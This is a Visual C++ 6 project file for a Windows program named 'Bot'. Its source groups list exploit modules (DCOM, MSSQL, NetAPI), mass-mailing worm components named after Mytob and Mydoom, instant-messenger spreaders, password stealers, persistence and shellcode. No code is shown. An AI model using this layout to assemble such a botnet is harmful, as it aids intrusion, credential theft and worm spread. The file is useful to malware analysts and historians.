# Microsoft Developer Studio Project File - Name="Bot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Console Application" 0x0103

CFG=Bot - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "bot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "bot.mak" CFG="Bot - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Bot - Win32 Release" (based on "Win32 (x86) Console Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 2
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /Gz /MD /w /W0 /GX /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG" /d "_AFXDLL"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:console /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib psapi.lib mpr.lib wininet.lib shlwapi.lib iphlpapi.lib urlmon.lib Netapi32.lib ws2_32.lib psapi.lib /nologo /entry:"STARTBOT" /machine:I386 /out:"BOT.exe" /libpath:"lib/openssl/win32/lib"
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "Bot - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Config"

# PROP Default_Filter ""
# Begin Group "Encrypt"

# PROP Default_Filter ""
# Begin Group "Blowfish"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\BlowFish.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Encryption.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Config.cpp
# End Source File
# End Group
# Begin Group "Main"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Bot.cpp
# End Source File
# Begin Source File

SOURCE=.\Commands.cpp
# End Source File
# Begin Source File

SOURCE=.\Main.cpp
# End Source File
# End Group
# Begin Group "Protocol"

# PROP Default_Filter ""
# Begin Group "Socket"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\SocketTest.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Connect.cpp
# End Source File
# End Group
# Begin Group "File Trans"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Download.cpp
# End Source File
# Begin Source File

SOURCE=.\WormRide.cpp
# End Source File
# End Group
# Begin Group "Threading"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\CThread.cpp
# End Source File
# Begin Source File

SOURCE=.\Thread.cpp
# End Source File
# End Group
# Begin Group "Hash"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Crc32Static.cpp
# End Source File
# End Group
# Begin Group "Others"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\BotDetecter.cpp
# End Source File
# Begin Source File

SOURCE=.\BotKiller.cpp
# End Source File
# Begin Source File

SOURCE=.\delay.cpp
# End Source File
# Begin Source File

SOURCE=.\Detection.cpp
# End Source File
# Begin Source File

SOURCE=.\Honeypot.cpp
# End Source File
# Begin Source File

SOURCE=.\Host2.cpp
# End Source File
# Begin Source File

SOURCE=.\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\ifmirc.cpp
# End Source File
# Begin Source File

SOURCE=.\Install.cpp
# End Source File
# Begin Source File

SOURCE=.\Main_NetUtils.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\Persist.cpp
# End Source File
# Begin Source File

SOURCE=.\Process.cpp
# End Source File
# Begin Source File

SOURCE=.\Service.cpp
# End Source File
# Begin Source File

SOURCE=.\System.cpp
# End Source File
# Begin Source File

SOURCE=.\Utility.cpp
# End Source File
# End Group
# Begin Group "Scanner"

# PROP Default_Filter ""
# Begin Group "http"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\httpscan.cpp
# End Source File
# End Group
# Begin Group "Exploits "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\CmailServer.cpp
# End Source File
# Begin Source File

SOURCE=.\dcom2.cpp
# End Source File
# Begin Source File

SOURCE=.\mssql2.cpp
# End Source File
# Begin Source File

SOURCE=.\netapi.cpp
# End Source File
# Begin Source File

SOURCE=.\SecurityGateway.cpp
# End Source File
# End Group
# Begin Group "Worm"

# PROP Default_Filter ""
# Begin Group "Mail mytob3"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\mail\lib.c
# End Source File
# Begin Source File

SOURCE=.\mail\massmail.c
# End Source File
# Begin Source File

SOURCE=.\mail\msg.c
# End Source File
# Begin Source File

SOURCE=.\mail\scan.c
# End Source File
# Begin Source File

SOURCE=.\mail\xdns.c
# End Source File
# Begin Source File

SOURCE=.\mail\xsmtp.c
# End Source File
# Begin Source File

SOURCE=.\mail\zipstore.c
# End Source File
# End Group
# Begin Group "Mydoom2"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\dns.cpp
# End Source File
# Begin Source File

SOURCE=.\email.cpp
# End Source File
# Begin Source File

SOURCE=.\msg2.cpp
# End Source File
# Begin Source File

SOURCE=.\smtp.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\ICQApi.cpp
# End Source File
# Begin Source File

SOURCE=.\Mail.cpp
# End Source File
# Begin Source File

SOURCE=.\MsnV1.cpp
# End Source File
# Begin Source File

SOURCE=.\RarAdd.cpp
# End Source File
# Begin Source File

SOURCE=.\RarFix.cpp
# End Source File
# Begin Source File

SOURCE=.\YahooAPI.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Scanner.cpp
# End Source File
# Begin Source File

SOURCE=.\Shellcode.cpp
# End Source File
# End Group
# Begin Group "Stealers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\FLASHFXP.CPP
# End Source File
# Begin Source File

SOURCE=.\Pstore.cpp
# End Source File
# End Group
# Begin Group "Daemons"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\httpServer.cpp
# End Source File
# Begin Source File

SOURCE=.\Visit.cpp
# End Source File
# End Group
# Begin Group "SSL"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\SSLLib.cpp
# End Source File
# End Group
# Begin Group "SSH"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\SSHTest.cpp
# End Source File
# End Group
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Main "

# PROP Default_Filter ""
# Begin Group "Encryption"

# PROP Default_Filter ""
# Begin Group "Blowfish No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\blowfish.h
# End Source File
# End Group
# End Group
# Begin Source File

SOURCE=.\Commands.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\Hell.h
# End Source File
# Begin Source File

SOURCE=.\Include.h
# End Source File
# Begin Source File

SOURCE=.\Main.h
# End Source File
# End Group
# Begin Group "Protocol "

# PROP Default_Filter ""
# Begin Group "Socket No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\SocketTest.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\Connect.h
# End Source File
# End Group
# Begin Group "File Trans "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Download.h
# End Source File
# End Group
# Begin Group "Threading "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\CThread.h
# End Source File
# Begin Source File

SOURCE=.\thread.h
# End Source File
# End Group
# Begin Group "Hash  "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Crc32Static.h
# End Source File
# End Group
# Begin Group "Others "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\BotDetect.h
# End Source File
# Begin Source File

SOURCE=.\detect.h
# End Source File
# Begin Source File

SOURCE=.\Globals.h
# End Source File
# Begin Source File

SOURCE=.\Honeypot.h
# End Source File
# Begin Source File

SOURCE=.\hosts.h
# End Source File
# Begin Source File

SOURCE=.\ident.h
# End Source File
# Begin Source File

SOURCE=.\Killer.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\process.h
# End Source File
# Begin Source File

SOURCE=.\service.h
# End Source File
# Begin Source File

SOURCE=.\Utility.h
# End Source File
# End Group
# Begin Group "Scanner "

# PROP Default_Filter ""
# Begin Group "Http "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\http.h
# End Source File
# End Group
# Begin Group "Exploits"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\CMailServer.h
# End Source File
# Begin Source File

SOURCE=.\dcom2.h
# End Source File
# Begin Source File

SOURCE=.\httpserver.h
# End Source File
# Begin Source File

SOURCE=.\mssql.h
# End Source File
# Begin Source File

SOURCE=.\netapi.h
# End Source File
# Begin Source File

SOURCE=.\SecurityGateWay.h
# End Source File
# End Group
# Begin Group "Worm No. 1"

# PROP Default_Filter ""
# Begin Group "Mail mytob3 No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\mail\lib.h
# End Source File
# Begin Source File

SOURCE=.\Mail.h
# End Source File
# Begin Source File

SOURCE=.\mail\massmail.h
# End Source File
# Begin Source File

SOURCE=.\mail\msg.h
# End Source File
# Begin Source File

SOURCE=.\mail\scan.h
# End Source File
# Begin Source File

SOURCE=.\mail\utility.h
# End Source File
# Begin Source File

SOURCE=.\mail\xdns.h
# End Source File
# Begin Source File

SOURCE=.\mail\xsmtp.h
# End Source File
# Begin Source File

SOURCE=.\mail\zipstore.h
# End Source File
# End Group
# Begin Group "Mydoom2 No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\email.h
# End Source File
# Begin Source File

SOURCE=.\smtp.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\icqapi.h
# End Source File
# Begin Source File

SOURCE=.\msn1.h
# End Source File
# Begin Source File

SOURCE=.\rarworm.h
# End Source File
# Begin Source File

SOURCE=.\Yahoo.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\scanner.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# End Group
# Begin Group "Stealers No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\flashfxp.h
# End Source File
# End Group
# Begin Group "Daemons "

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\ftp.h
# End Source File
# Begin Source File

SOURCE=.\visit.h
# End Source File
# End Group
# Begin Group "SSL No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\ssl.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\Coderdecoder.h
# End Source File
# End Group
# End Target
# End Project
